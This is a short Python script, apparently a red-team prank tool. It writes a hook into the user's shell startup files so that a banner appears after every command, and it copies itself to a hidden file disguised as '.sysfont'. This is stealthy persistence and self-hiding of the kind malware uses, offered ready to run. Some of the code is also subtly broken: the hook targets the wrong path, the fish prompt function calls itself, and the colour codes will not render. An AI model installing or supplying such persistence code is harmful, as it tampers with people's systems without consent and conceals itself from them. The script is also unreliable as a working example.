#!/usr/bin/env python3
# redteam_instant.py - RED TEAM banner after EVERY command — instantly

import os
import sys

SCRIPT = os.path.abspath(__file__)

BANNER = r"""
\033[91m
PLACEHOLDER
\033[0m
"""

def show():
    print(BANNER)

def install():
    hook = f'python3 "{SCRIPT}" show 2>/dev/null || true\n'

    configs = [
        "~/.bashrc",
        "~/.bash_profile",
        "~/.zshrc",
        "~/.zprofile",
        "~/.profile",
        "~/.config/fish/config.fish"
    ]

    for cfg in configs:
        path = os.path.expanduser(cfg)
        try:
            if "fish" in path:
                if not os.path.exists(os.path.dirname(path)):
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "a") as f:
                    f.write(f'\nfunction fish_prompt\n    {hook}    command fish_prompt\nend\n')
            else:
                if os.path.exists(path) or "bashrc" in path or "profile" in path:
                    with open(path, "a") as f:
                        f.write(f'\n{hook}')
            print(f"[+] Installed in {cfg}")
            break
        except:
            continue
    else:
        print("[-] No shell config found")

    # Hide the script
    hidden = os.path.expanduser("~/.cache/.sysfont")
    os.system(f"cp '{SCRIPT}' '{hidden}' && chmod +x '{hidden}' 2>/dev/null")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--setup":
            install()
            print("[+] RED TEAM now appears after EVERY command — instantly and forever")
            sys.exit(0)
        elif sys.argv[1] == "show":
            show()
            sys.exit(0)
    else:
        show()
